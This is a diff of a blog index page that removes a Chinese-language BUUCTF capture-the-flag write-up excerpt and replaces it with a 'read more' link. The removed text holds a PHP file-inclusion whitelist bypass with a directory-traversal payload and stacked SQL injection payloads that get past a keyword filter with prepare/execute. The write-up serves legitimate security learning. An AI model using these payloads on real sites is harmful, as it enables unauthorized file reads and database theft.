@@ -431,93 +431,14 @@
 
       
         
-          
-            <h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><p>好多之前比赛没做也没来得及补的题，良心平台QAQ</p>
-<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>source.php里源码</p>
-<pre><code>&lt;?php
-highlight_file(__FILE__);
-class emmm
-{
-    public static function checkFile(&amp;$page)
-    {
-        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
-        if (! isset($page) || !is_string($page)) {
-            echo &quot;you can&apos;t see it&quot;;
-            return false;
-        }
-
-        if (in_array($page, $whitelist)) {
-            return true;
-        }
-
-        $_page = mb_substr(
-            $page,
-            0,
-            mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
-        );
-        if (in_array($_page, $whitelist)) {
-            return true;
-        }
-
-        $_page = urldecode($page);
-        $_page = mb_substr(
-            $_page,
-            0,
-            mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
-        );
-        if (in_array($_page, $whitelist)) {
-            return true;
-        }
-        echo &quot;you can&apos;t see it&quot;;
-        return false;
-    }
-}
-
-if (! empty($_REQUEST[&apos;file&apos;])
-    &amp;&amp; is_string($_REQUEST[&apos;file&apos;])
-    &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])
-) {
-    include $_REQUEST[&apos;file&apos;];
-    exit;
-} else {
-    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-}  
-?&gt; 
-</code></pre><p>可以看到我们需要get传递file参数；<br>checkFile函数检查了传递参数；<br>mb_strpos函数检测第一次出现? 的位置；<br>mb_substr函数返回了file参数0和第一个问号之间的值，<br>in_array函数检测在$whitelist是否含$_page的值也就是source.php和hint.php</p>
-<p>之后存在include函数，所以我们构造payload:</p>
-<pre><code>?file=hint.php?/../../../../../../../../ffffllllaaaagggg
-</code></pre><p>hint.php?/被当成了目录<br>拿到flag</p>
-<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>测试1’or 1=1#可行，存在sql注入<br>1’order by 2#可行，到3报错，查询列数为2<br>然后测试 1’union select 1,2#</p>
-<pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);  
-</code></pre><p>select被过滤了，show没有被过滤，构造闭合语句进行<br>查询  </p>
-<h4 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h4><p>在mysql中前语句闭合分号结束后后面的语句也会被执行<br><img src="/2019/07/28/BUUCTF-1/2.png" alt=" "></p>
-<p>查询：  </p>
-<pre><code>1&apos;;show databases;
-</code></pre><p><img src="/2019/07/28/BUUCTF-1/1.png" alt=" "></p>
-<pre><code>1&apos;;show tables;
-</code></pre><p><img src="/2019/07/28/BUUCTF-1/3.png" alt=" "></p>
-<pre><code>1&apos;;show columns from 1919810931114514;
-</code></pre><p>(不知道为啥查不出来<br>破案了，字符串作为表名需要加反引号</p>
-<pre><code>1&apos;;show columns from `1919810931114514`;
-</code></pre><p><img src="/2019/07/28/BUUCTF-1/5.png" alt=" ">‘</p>
-<p>但到此处就无法查询字段的内容了  </p>
-<p>大佬writeup中的姿势一个比一个骚：</p>
-<h4 id="存储过程绕过"><a href="#存储过程绕过" class="headerlink" title="存储过程绕过"></a>存储过程绕过</h4><p>sql serve中给变量幅值可以用</p>
-<pre><code>set @变量名=&apos;字符串&apos;;
-</code></pre><p>prepare语句用于预备一个语句，并指定语句名称，以后可用名称引用该语句。语句名称对大小写不敏感。from后可以是一个文字字符串，也可以是一个包含了语句文本的用户变量。该文本必须表现为一个单一的SQL语句，而不是多个语句。<br>语法</p>
-<pre><code>prepare 语句定义名称 from 变量名称;
-</code></pre><p>execute语句用于执行命令<br>语法   </p>
-<pre><code>execute 变量名称;
-</code></pre><p><img src="/2019/07/28/BUUCTF-1/6.png" alt=" "><br>payload：</p>
-<pre><code>1&apos;;Set @a=concat(&apos;s&apos;,&apos;elect * from `1919810931114514`&apos;);prepare s from @a;execute s;
-</code></pre><p>strstr对set进行了一步过滤，不过没什么影响，大小写就能绕过(这么看这种解法应该是预期解。</p>
-<h4 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h4><p>这个真的是太骚了<br>正则中没有过滤alert和rename关键字  </p>
-<p>alter和rename命令</p>
-<p>alter table 原表名 rename to 新表名;</p>
-<p>alter table 表名 change 要修改的字段名  新字段名 新字段的数据类型;</p>
-<p>(题目好像挂了，明天写</p>
-<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3>
-          
+          <h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><p>好多之前比赛没做也没来得及补的题，良心平台QAQ</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/28/BUUCTF-1/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
